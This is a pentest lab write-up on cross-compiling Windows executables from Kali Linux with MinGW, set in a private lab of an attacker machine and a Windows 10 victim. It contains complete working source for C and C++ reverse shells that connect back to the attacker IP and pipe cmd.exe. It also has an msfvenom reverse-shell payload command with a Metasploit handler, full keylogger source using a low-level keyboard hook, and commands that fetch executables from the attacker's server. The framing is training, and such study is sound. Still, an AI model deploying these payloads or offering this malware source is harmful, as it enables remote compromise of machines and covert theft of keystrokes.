<h1 align="center"> Windows Cross-Compilation </h1>

<img width="1024" height="600" alt="Cross-Compilation" src="https://github.com/user-attachments/assets/6c73b6fe-4671-417b-af7f-f93aa2b5235a" />

---


## Scope:
- **Attacker**: Kali Linux (IP `192.168.127.128`)
- **Victim**: Windows 10 (IP `192.168.127.142`)


---

## Table of Contents:
[Introduction to Windows Cross-Compilation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#introduction-to-cross-compilation)
  [What is Cross-Compilation?](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#what-is-cross-compilation)
  [Detailed Explanation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#detailed-explanation)

[Setup Lab](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#setup-lab)

[Cross Compilation Methodology](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#cross-compilation-methodology)
  1. [On Compilation](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#1-on-compilation)
  2. [Reverse Shell in C](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#2-reverse-shell-in-c)
  3. [COMPILING METASPLOIT PAYLOADS FROM](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#compiling-metasploit-payloads-from)
  4. [Argument-ware Program](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#4-argument-ware-program)
  5. [C++ PROGRAMS](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#5-c-programs)
  6. [Keylogger](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#6-keylogger)
  7. [Advance keylogger](https://github.com/Nin-Kanong/pentest-writeups/blob/main/5.%20Post_Exploitation/1.%20Privilege_Escalation/2.%20Windows%20Privilege%20Escalation/07.%20Cross_Compilation.md#7-advance-keylogger)

---





# Introduction to Windows Cross-Compilation


## What is Cross-Compilation?
Cross-compilation is the process of compiling code on one system (the host) to produce an executable that runs on a different system (the target). For example, compiling a Windows `.exe` file while working on a Linux machine


## Detailed Explanation
- Normal compilation: You write code and compile it on the same system where it will run. Example: compiling C code on Linux to run on Linux.
- Cross-compilation: We compile code on one system, but the output is meant for another system with a different architecture or operating system. Example: compiling on Linux using `x86_64-w64-mingw32-gcc` to produce a Windows executable.
**This is especially useful when**:
- The target system is too small or limited to host a compiler (e.g., embedded devices, IoT boards).
- We want to build software for multiple platforms without switching machines.
- We’re developing for systems where native compilers aren’t available.





### Basic Concept:
````
Cross-compilation = Compiling code on one system (e.g., Kali Linux)
                    to run on a DIFFERENT system (e.g., Windows)
````


### Why Cross-Compile?
- No compiler on target - Windows might not have gcc, make, etc.
- Faster development - Compile on powerful Kali, run on slower Windows
- Environment issues - Target might lack libraries or dependencies
- Stealth - Don't leave compiler tools on target system



## On Compilation
With `compilation` we refer to the act of `translating` a source code into a language that is then able to execute on a given CPU architecture.
````
source code ---> compilation ---> binary
````
- Compilation can be a complex process involving multiple stages.
- The general idea however is binaries are compiled for specific environments. Here with `environment` we mean a combination of:
  - Hardware Architecture
  - Operating System
  - Other user-space program and configurations




---



# Setup Lab

Download **MiGW-w64**:
- Go to: https://sourceforge.net/projects/mingw-w64/ 
- Click Download to get the installer (`mingw-w64-install.exe`).

- After I downloaded it:
<img width="1008" height="942" alt="image" src="https://github.com/user-attachments/assets/74199633-42ec-409d-8e5b-165cb9fbb0f4" />

- Doubles-Click` on it -> `Next`:
<img width="640" height="390" alt="image" src="https://github.com/user-attachments/assets/d5fe4298-a64b-457c-883e-9617e3013977" />

<img width="642" height="388" alt="image" src="https://github.com/user-attachments/assets/40c875a0-95f0-4f3d-ac35-68cec757e708" />

<img width="638" height="391" alt="image" src="https://github.com/user-attachments/assets/30a73b82-908f-40db-bacd-0d63ec34272e" />

- After it will start install:
<img width="641" height="392" alt="image" src="https://github.com/user-attachments/assets/aa14cd75-6fb4-48ea-bc1f-56987f8ca559" />

- After we wait it a few minutes, and now it finished:
<img width="641" height="390" alt="image" src="https://github.com/user-attachments/assets/20133c3d-26cc-440b-a882-38a744c120c5" />

- After type this command:
````
pacman -S mingw-w64-ucrt-x86_64-gcc
````
<img width="1903" height="765" alt="image" src="https://github.com/user-attachments/assets/63a7b3d0-118c-4635-8a65-1bfb5fbb327a" />


- Now it finished install, After Verify it:
````
x86_64-w64-mingw32-gcc --version
````
<img width="563" height="167" alt="image" src="https://github.com/user-attachments/assets/73131155-1c1e-4c6b-9bd0-1d43d4aee4f0" />

- Now we see the GCC version is `15.1.0`.

- Now we succeed to install and Setup MinGW.

---





# Cross Compilation Methodology



## 1. On Compilation 

### Simple c program
````
mousepad hello.c
````
````
#include <stdio.h>

int main() {
    printf("Hello World!\n");
    return 0;
}
````
<img width="532" height="334" alt="image" src="https://github.com/user-attachments/assets/20987312-3954-439e-a296-80cff59e4216" />


````
ls -l hello.c
gcc hello.c -o hello
ls -l hello
````
<img width="572" height="386" alt="image" src="https://github.com/user-attachments/assets/c2cb58fc-0d45-4746-b2b0-2cb358396205" />


````
file hello
````
<img width="1903" height="113" alt="image" src="https://github.com/user-attachments/assets/886cfed3-bcbf-4788-a69b-e9806f7e34fd" />


````
./hello
````
<img width="262" height="91" alt="image" src="https://github.com/user-attachments/assets/e4103914-edf6-40da-a41d-d2948caeeb7e" />

- Now we see `Hello World!`.

#### Transfer to windows target
````
nc -lvnp 4321 < hello
````
<img width="345" height="169" alt="image" src="https://github.com/user-attachments/assets/41803611-944b-4448-93fb-1029f1a1eadc" />

- After back to windows.

#### On windows
````
./nc64.exe 192.168.127.128 4321 > hello.exe
````
<img width="797" height="210" alt="image" src="https://github.com/user-attachments/assets/f0d03421-b75f-4bdf-8ef9-2f94efcc11a4" />

- **Note**: In this we need to run powershell as `Administrator`.

- After backto our attacker.

#### On kali
<img width="709" height="186" alt="image" src="https://github.com/user-attachments/assets/24cfd05e-7c03-4d83-9707-284b372dd39f" />

- Now we see target `192.168.127.128` connect back.


- And then on target (Windows) -> Press `Ctrl + C`:
<img width="905" height="377" alt="image" src="https://github.com/user-attachments/assets/50443da6-f247-4c42-a3b5-b2eb52dc3026" />

- Now we see file that we was copy from our target.




#### On windows 
- In this i go to my file
````
cd C:\Users\k4n0ng\Hello
ls
````
<img width="730" height="444" alt="image" src="https://github.com/user-attachments/assets/edcbe5a7-0778-4229-981b-662e1d398299" />

- Now i don't see any file `hello.exe`.

- After
````
nc64.exe 192.168.127.128 4321 > hello.exe
````
- OR we can use this:
````
.\nc64.exe 192.168.127.128 4321 > hello.exe
````
<img width="783" height="154" alt="image" src="https://github.com/user-attachments/assets/a8eb5f3b-6ca3-4195-b5e8-bb2bd50711e9" />

- After go back to our attacker (Kali):
<img width="704" height="179" alt="image" src="https://github.com/user-attachments/assets/5adba807-30a4-4515-abe9-f529d0bddfa9" />

- NOw we see the target connect back to our attack. And then back to our target (Windwos).


#### On Windows 
- After we was connect to our kali (Attacker) -> Press `Ctrl + C`, And then check file:
````
ls 
````
- Or:
````
ls hello.exe
````
<img width="797" height="705" alt="image" src="https://github.com/user-attachments/assets/ecef39b5-4814-4e04-ac1f-987831ea1b3e" />


- Now we was successful to transfer the file.
````
.\hello.exe
````
<img width="1283" height="611" alt="image" src="https://github.com/user-attachments/assets/5e27273e-8201-486d-9276-9e09c60feb92" />

<img width="1633" height="422" alt="image" src="https://github.com/user-attachments/assets/ee767874-6611-45cd-91f2-3d8f8642f112" />

- But in this it not work, after use this
````
x86_64-w64-mingw32-gcc hello.c -o hello.exe
````
<img width="651" height="72" alt="image" src="https://github.com/user-attachments/assets/87858188-2e09-47fc-bf25-30bc22307491" />

- But in this it still not work.  


#### To fix it:
- Click on `Start-Menu`: 
<img width="885" height="935" alt="image" src="https://github.com/user-attachments/assets/e609d01f-0a8c-4cdb-a0b1-eb8607ede8ed" />

<img width="652" height="673" alt="image" src="https://github.com/user-attachments/assets/1267959e-4de6-4109-85b4-00b41f955ae5" />

- After it will show this:
<img width="959" height="938" alt="image" src="https://github.com/user-attachments/assets/0d197dbd-49fa-44e5-9b04-0bf26cc1ff74" />

````
cd /c/Users/k4n0ng/Helo
x86_64-w64-mingw32-gcc hello.c -o hello.exe
````
<img width="710" height="383" alt="image" src="https://github.com/user-attachments/assets/0e02186d-8ad1-4810-a1f8-38eb510d45ee" />

- But in this we still error, cause we don't have file `hello.c`


- So in this i want to transfer file from akli to target windows:
- First i this I open Python server:
````
python3 -m http.server 4444
````
<img width="619" height="157" alt="image" src="https://github.com/user-attachments/assets/190b011a-7bb9-4623-8beb-a3e9e64f154a" />

 
- After on windows:
````
curl http://192.168.127.128:4444/hello.c -o hello.c
````
<img width="874" height="457" alt="image" src="https://github.com/user-attachments/assets/2af89ed3-af05-4809-9e73-d417930551bf" />

- After go back to `MinGW`:
````
ls
````
<img width="718" height="367" alt="image" src="https://github.com/user-attachments/assets/81f14206-33ac-4994-996f-eba8961ea49f" />


#### Compile the source
````
x86_64-w64-mingw32-gcc hello.c -o hello.exe
````
<img width="378" height="96" alt="image" src="https://github.com/user-attachments/assets/8966d3e2-5c98-47c5-b49e-3e7ba13a158a" />

- Verify
````
ls hello.exe
./hello.exe
````
<img width="399" height="124" alt="image" src="https://github.com/user-attachments/assets/01d5fdd7-e527-4fe8-b52b-5568b5d78db7" />

- Now we got successful to `Run` the attacker file.

---





## 2. Reverse Shell in C

### Create Reverse Shell Program
````
mousepad revshell.c
````
````
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *ip = "192.168.127.128";  // CHANGE THIS
    int port = 4444;              // CHANGE THIS
    
    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    // Setup address structure
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    
    // Connect to attacker
    WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL);
    
    // Setup process startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    
    // Start cmd.exe
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    
    // Wait for process
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    
    return 0;
}
````
<img width="793" height="758" alt="image" src="https://github.com/user-attachments/assets/dd071f61-e074-42e8-8dc6-54969d0681eb" />

- To save file press `Ctrl + S`.
````
ls -lha revshell.c
````
<img width="610" height="216" alt="image" src="https://github.com/user-attachments/assets/758f7e8b-5f2a-4ad3-9722-f4aa7e1d9e5a" />



### Compile the program
````
gcc revshell.c -o revshell
````
<img width="713" height="149" alt="image" src="https://github.com/user-attachments/assets/e1dd56e6-8fae-4f84-953e-2c4682568c7d" />

- This will produce a binary called `revshell`.

> In this we will error cause this script is for windows.



### Transfer to target:

#### On attacker (kali)
````
python3 -m http.server 4444
````
<img width="635" height="144" alt="image" src="https://github.com/user-attachments/assets/7d833255-b9e3-40ab-be3f-58665479dd09" />

- After back to target.


#### On target 
````
curl http://192.168.127.128:4444/revshell.c -o revshell.c
````
<img width="969" height="126" alt="image" src="https://github.com/user-attachments/assets/2d898f47-cdac-4aa7-8ab3-b113ecc0a829" />

- Check it:
````
ls revshell.c
````
<img width="701" height="273" alt="image" src="https://github.com/user-attachments/assets/90281e7d-5b0a-4b11-9b18-edb64f8f6f6c" />

- Now we got attacker file.


### Open MSYS2 UCRT64 shell
- From the `Start Menu` ->  - launch `MSYS2 MinGW UCRT64`.
<img width="647" height="677" alt="image" src="https://github.com/user-attachments/assets/ecdaccbe-94a1-47ca-bd6b-09de69d1454c" />

- Navigate to our folder:
````
cd /c/Users/k4n0ng/Helo
````
<img width="816" height="207" alt="image" src="https://github.com/user-attachments/assets/a1478d66-5c13-4c9b-9bc3-48b8dd19123a" />


#### Compile the source
Use the MinGW GCC compiler and link the Winsock library:
````
x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32
````
<img width="863" height="308" alt="image" src="https://github.com/user-attachments/assets/2482cbd6-1957-45bc-b98b-740f6f006a7b" />

- `-lws2_32` is required because the program uses Winsock functions.


### Run the program

#### On kali start listener:
````
nc -lvp 4444
````
<img width="359" height="139" alt="image" src="https://github.com/user-attachments/assets/9d86f127-b8df-4e12-a632-2208d9ea15a8" />


#### On windows (target)
````
.\revshell.exe
````
<img width="380" height="109" alt="image" src="https://github.com/user-attachments/assets/45499f60-c8e4-423d-8484-6f7e508ea694" />

- IF it error.

- On powershell:
````
cd C:\Users\k4n0ng\Helo
.\revshell.exe 192.168.127.128 4444
````
<img width="725" height="136" alt="image" src="https://github.com/user-attachments/assets/d0fc25f0-543a-43a3-aa56-4c0d8be0c58b" />

- `192.168.127.128`: is my attacker (kali) IP.
- `4444`: is my NC port that we open on attacker.
- After back to our attacker.

> Note: We run this on powershell.


### On attacker:
<img width="585" height="704" alt="image" src="https://github.com/user-attachments/assets/8d0fa976-c11d-41f2-9b33-9219556e286a" />

<img width="682" height="815" alt="image" src="https://github.com/user-attachments/assets/037a6b06-e5b8-4ae5-9da7-c81424be09f2" />

<img width="791" height="784" alt="image" src="https://github.com/user-attachments/assets/5a520e72-a35a-49c3-92e2-a0d09d62bd63" />

- Now we got successful to get target shell.


---





## 3. COMPILING METASPLOIT PAYLOADS FROM 

### Get Metasploit Source
In this we can download metasploit framework:
````
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
````
<img width="1555" height="340" alt="image" src="https://github.com/user-attachments/assets/603ab66d-7bea-4f3c-a612-a050545257c5" />

- Look for C source files
````
find . -name "*.c" -type f
````
<img width="551" height="776" alt="image" src="https://github.com/user-attachments/assets/0c48d4af-95ec-4e52-bc8b-70cf59d19842" />

- Now we see o  alots C.

### Compiling a standalone payload
If we want to practice compiling a payload in C (outside of Metasploit’s Ruby system), we can write a simple stub like:
````
mousepad standalone_shell.c
````
````
#include <stdlib.h>
int main() {
    system("cmd.exe");
    return 0;
}
````
<img width="559" height="284" alt="image" src="https://github.com/user-attachments/assets/f1d4ab8a-cace-48e1-a641-ff2ffe5c967e" />


### Compile on kali:
````
x86_64-w64-mingw32-gcc standalone_shell.c -o standalone.exe
````
<img width="537" height="222" alt="image" src="https://github.com/user-attachments/assets/ce58e9a4-aaa0-4921-b96a-9a5ee1525aa8" />

- Now we see our file `standalone.exe`.


### Transfer to target:
````
python3 -m http.server 5555
````
<img width="527" height="147" alt="image" src="https://github.com/user-attachments/assets/120f62ef-1759-4345-af5f-554a3dea6854" />

- After go back to our target.


### On target:
````
curl http://192.168.127.128:5555/standalone.exe -o standalone.exe
````
<img width="1007" height="290" alt="image" src="https://github.com/user-attachments/assets/96a37b70-2095-4906-9091-4e0c0cfaf579" />

- Now we got a file that attack send.


- After go back to our **Attacker (kali)**:
````
nc -lvp 5555
````
<img width="389" height="149" alt="image" src="https://github.com/user-attachments/assets/7cd74773-2937-4e48-bb62-2e187c43a2bc" />


- Run
````
.\standalone.exe
````
<img width="546" height="168" alt="image" src="https://github.com/user-attachments/assets/89af77af-3f77-4a56-afe7-b811450ceb96" />


````
.\standalone.exe 192.168.127.128 5555
````







### Generate a payload with msfvenom:
````
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f exe -o payload.exe
````
<img width="998" height="280" alt="image" src="https://github.com/user-attachments/assets/e616766e-8551-479e-948d-d9240c27e620" />

- Now we see the payload file.

### Transfer and run payload on target (Windows):

- On attacker first we need to run python server:
````
python3 -m http.server 4444
````
<img width="644" height="152" alt="image" src="https://github.com/user-attachments/assets/c8bc4747-95a1-491d-8447-e6a1863300c1" />


````
curl http://192.168.127.128:4444/payload.exe -o payload.exe
.\payload.exe
````
<img width="967" height="823" alt="image" src="https://github.com/user-attachments/assets/a86bfc8c-9c1d-4958-9b9d-727c550da716" />

- In this i find my folder, and after I download file `payload.exe`.


### Set-up a handler in metasploit
````
msfconsole -q
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
run
````
<img width="697" height="337" alt="image" src="https://github.com/user-attachments/assets/235c4908-6acc-4847-8efc-b296f2b8f7a1" />

- After we need to transfer the payload file to target.


### On target (windows)
````
.\payload.exe
````
<img width="603" height="129" alt="image" src="https://github.com/user-attachments/assets/560de8dc-8376-4ea3-a5c1-adbdfad6af2d" />

- Now we got successful.
- Why nothing shows
  - **Payload is silent by design**: 
   - Many reverse shell or Meterpreter payloads don’t print anything when executed. 
   - They simply try to connect back to the listener (Metasploit handler or Netcat).
   - If the listener isn’t running or the IP/port don’t match, the program exits quietly.
  - **Listener mismatch**:
   - If you generated the payload with `LHOST=192.168.127.128 LPORT=4444`, then our handler must be listening on exactly that IP and port.
   - If our handler is on a different port (like 5555) or bound to the wrong interface, the payload can’t connect.
  - **Firewall/AV interference**:
   - On Windows, Defender or AV may block the connection attempt silently.
   - In a lab, we may need to disable or adjust firewall settings to allow the test


- Now we got success, after go back to our attacker.


### On attacker:
<img width="1135" height="802" alt="image" src="https://github.com/user-attachments/assets/da7d0c03-a554-4993-adf9-2680e36ee524" />

<img width="813" height="739" alt="image" src="https://github.com/user-attachments/assets/3a37e836-86c2-4206-a46a-ebf2de46defc" />


- Now we got target shell, and we can type any command to more information of this system.


---




## 4. Argument-ware Program

- Create file:
````
sudo mousepad arg.c
````
````
#include <stdio.h>
int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: program <IP> <PORT>\n");
        return 1;
    }
    printf("Target IP: %s\n", argv[1]);
    printf("Target Port: %s\n", argv[2]);
    return 0;
}
````
<img width="596" height="395" alt="image" src="https://github.com/user-attachments/assets/da5c5cf9-112f-4442-a80c-782a857ba5d0" />


### Compillation:
````
x86_64-w64-mingw32-gcc arg.c -o arg.exe
````
<img width="541" height="61" alt="image" src="https://github.com/user-attachments/assets/efa09036-0fb7-4f7d-9194-9e5944f3f979" />


- Find file `arg`:
````
ls -la *arg*
````
<img width="606" height="106" alt="image" src="https://github.com/user-attachments/assets/1704592f-071c-4079-8468-5890071e8f82" />


### Transfer

#### On kali:
````
python3 -m http.server 5555
````
<img width="658" height="133" alt="image" src="https://github.com/user-attachments/assets/5f072495-6ba7-4334-adcd-25750a46d0f2" />


#### On windows:
````
curl http://192.168.127.128:5555/arg.exe -o arg.exe
````
<img width="932" height="320" alt="image" src="https://github.com/user-attachments/assets/60b7cb50-4ef9-4b83-8a6a-e5c72be19280" />




#### On attacker:
````
nc -lvp 5555
````
<img width="324" height="155" alt="image" src="https://github.com/user-attachments/assets/3a860206-fd80-409d-b2ce-a125fdcfc1be" />


- Run file:
````
.\arg.exe 192.168.127.128 5555
````
<img width="679" height="138" alt="image" src="https://github.com/user-attachments/assets/a506303d-cc17-4062-973f-787e149dc10c" />

- Confirms argument parsing works in cross‑compiled Windows executables.

---






## 5. C++ PROGRAMS

### Download C++ 
- First in this we need to download **C++**:

- Update MSYS2 packages
````
pacman -Syu
````
<img width="1919" height="812" alt="image" src="https://github.com/user-attachments/assets/1a680099-e34c-4aa5-bb93-c8595bab7e42" />

- In this we just type `Y` it will auto close.

- Close and reopen the shell, then run again:
````
pacman -Su
````
<img width="1898" height="890" alt="image" src="https://github.com/user-attachments/assets/a1e96c14-4dcd-4e4c-9a23-0a465fbb444d" />

- After wait a few minute it will finshed download.
<img width="1900" height="828" alt="image" src="https://github.com/user-attachments/assets/0a05e0cf-baac-4627-82db-b39c286b4db8" />



### Install MinGW‑w64 compilers
````
pacman -S mingw-w64-x86_64-gcc
````
<img width="1891" height="858" alt="image" src="https://github.com/user-attachments/assets/e05dea61-0fcb-43ab-92a7-6f0f3d0505ba" />

<img width="1902" height="827" alt="image" src="https://github.com/user-attachments/assets/9ae79890-0037-4f51-8aea-ea8e98a51719" />

- Now it finished.

- Verify installation:
````
x86_64-w64-mingw32-g++ --version
````
<img width="828" height="202" alt="image" src="https://github.com/user-attachments/assets/b36ec075-c77f-4e93-9264-d59b73609b47" />

- Now we succeed to install **C++**. 



### C++ Reverse Shell

#### On Attacker
- Create C++ file
````
mousepad revshell.cpp
````
````
// revshell.cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <cstdlib>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT>\n";
        return 1;
    }

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<u_short>(port));
    InetPtonA(AF_INET, ip.c_str(), &addr.sin_addr);

    if (connect(sock, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = reinterpret_cast<HANDLE>(sock);

    if (!CreateProcessA(
        nullptr,
        const_cast<char*>("cmd.exe"),
        nullptr,
        nullptr,
        TRUE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    )) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}
````
<img width="789" height="751" alt="image" src="https://github.com/user-attachments/assets/ccfde7e6-394b-4131-ad9f-bb713b8cb61a" />

<img width="408" height="133" alt="image" src="https://github.com/user-attachments/assets/0bfd3cb5-2458-4082-8cc2-f1fd24d9da37" />


### Compile on kali:
````
x86_64-w64-mingw32-g++ revshell.cpp -o revshell.exe -lws2_32
````
- But in this I not yet to install on my kali:
<img width="1705" height="763" alt="image" src="https://github.com/user-attachments/assets/4e6a05f4-0dc3-462e-9163-ac6541dd8ee2" />

- After compilation it again:
````
x86_64-w64-mingw32-g++ revshell.cpp -o revshell.exe -lws2_32
````
<img width="702" height="143" alt="image" src="https://github.com/user-attachments/assets/543317e3-75b1-4f51-9388-36c44901377d" />

- But when i compile it still error, after i install MinGW:
````
sudo apt install g++-mingw-w64-x86-64
````
<img width="1679" height="795" alt="image" src="https://github.com/user-attachments/assets/0fb1661d-d442-4cd6-a7c8-57a6ba80f665" />

- Verify include paths Run:
````
x86_64-w64-mingw32-g++ -v
````
<img width="1894" height="278" alt="image" src="https://github.com/user-attachments/assets/a2422bd8-a125-4b73-b48e-37a026addf67" />


- After run it again:
````
x86_64-w64-mingw32-g++ revshell.cpp -o revshell.exe -lws2_32
ls -la *revshell*
````
<img width="792" height="185" alt="image" src="https://github.com/user-attachments/assets/de5adaab-247e-4c92-b81e-8653d7dd25c1" />


### Transfer to traget:

#### On attacker (kali)
````
python3 -m http.server 5555
````
<img width="689" height="126" alt="image" src="https://github.com/user-attachments/assets/72b8b3d1-ee77-4295-ad1f-8e17d32f67b2" />


#### On target (windows)
Use `IW`:
````
Invoke-WebRequest http://192.168.127.128:5555/revshell.exe -OutFile revshell.exe
````
<img width="1187" height="307" alt="image" src="https://github.com/user-attachments/assets/aeadbb1f-b49d-4680-b692-609c2dbc50f0" />

- Now we got file.



#### On attacker (kali)
````
nc -lvnp 4444
````
<img width="336" height="191" alt="image" src="https://github.com/user-attachments/assets/115c0115-b7e2-4a05-9667-4ea1a6192ce4" />

- After back to target.

#### On target (Windows)
````
.\revshell.exe 192.168.127.128 4444
````
<img width="688" height="123" alt="image" src="https://github.com/user-attachments/assets/ebe9f810-de64-4289-98d0-4f5c9dca5d4d" />

- IF in this we not get success, we can do any way:

### Use **MSYS2 USRT64**:
<img width="652" height="685" alt="image" src="https://github.com/user-attachments/assets/91c95b6c-1fc8-4171-8932-f5443028930f" />

- Find our folder that have file `revshell.exe`:
````
cd /c/Users/k4n0ng
````
<img width="684" height="674" alt="image" src="https://github.com/user-attachments/assets/09af35f0-1e38-49ea-8893-ea4d548b11d4" />

````
cd Helo
 ./revshell.exe 192.168.127.128 4444
````
<img width="639" height="316" alt="image" src="https://github.com/user-attachments/assets/c2e2e741-62d7-48b9-bf3f-64aeb23e0b97" />

- After back to our attacker.


### On attacker:
<img width="1143" height="786" alt="image" src="https://github.com/user-attachments/assets/4d19f14e-658e-48cd-9a6f-cbbbdaf8f7b8" />

<img width="988" height="792" alt="image" src="https://github.com/user-attachments/assets/a8995668-8143-45bc-8931-b07f3b096faf" />

- Now we got successful to get shell. And can view target information.


---





## 6. Keylogger


### Create file 
````
mousepad keylogger.c
````
````
#include <windows.h>
#include <stdio.h>

// Log a single character
void log_char(char c) {
    FILE *f = fopen("keys.txt", "a");
    if (f) {
        fputc(c, f);
        fflush(f);
        fclose(f);
    }
}

// Log a string (for special keys)
void log_string(const char* s) {
    FILE *f = fopen("keys.txt", "a");
    if (f) {
        fputs(s, f);
        fflush(f);
        fclose(f);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (vk == VK_RETURN)     log_string("\n");
            else if (vk == VK_SPACE) log_char(' ');
            else if (vk == VK_BACK)  log_string("<BACKSPACE>");
            else if (vk == VK_TAB)   log_string("<TAB>");
            else if (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU) {
                // Skip
            }
            else {
                BYTE keys[256];
                GetKeyboardState(keys);
                WORD char_code;
                ToAscii(vk, p->scanCode, keys, &char_code, 0);
                char c = (char)char_code;
                if (c >= 32 && c <= 126) {
                    log_char(c);
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
````
<img width="801" height="742" alt="image" src="https://github.com/user-attachments/assets/6f13d3c8-1bb9-4b21-9f33-8006ad057a5e" />

- Check our file:
````
ls -la keylogger.c
````
<img width="590" height="146" alt="image" src="https://github.com/user-attachments/assets/bef40cad-3641-4f91-8b02-a9bd3383cf3c" />


### Compile to Windows EXE
````
x86_64-w64-mingw32-gcc keylogger.c -o keylogger.exe -static
````
<img width="685" height="70" alt="image" src="https://github.com/user-attachments/assets/69985758-3737-4552-9d03-f576f94a19e4" />

````
ls -la *keylogger*
````
<img width="667" height="160" alt="image" src="https://github.com/user-attachments/assets/775b0b8c-835c-4221-ba2e-d342db423b7d" />


### Transfer file to target:

#### On Attacker (Kali):
````
python3 -m http.server 4444
````
<img width="675" height="156" alt="image" src="https://github.com/user-attachments/assets/0e00417e-17c1-4ed1-ab01-da53f59c570c" />


#### On Target(Windows):
````
iwr -uri "http://192.168.127.128:4444/keylogger.exe" -OutFile keylogger.exe
````
<img width="1128" height="880" alt="image" src="https://github.com/user-attachments/assets/7e98bcd4-807a-4e94-97b6-6a783337b18e" />


### In this it work with CMD
````
cd C:\Users\k4n0ng\Helo
keylogger.exe
````
<img width="526" height="616" alt="image" src="https://github.com/user-attachments/assets/2f59f0ad-6d8d-499f-bfc5-7b06fd6815c2" />

- Now we can listen others type anything like in this I -> Press `Ctrl + S` -> Open `Notepad`  -> And type anything:
<img width="633" height="464" alt="image" src="https://github.com/user-attachments/assets/9482c15b-e2a2-4fbc-9376-79123c50c043" />

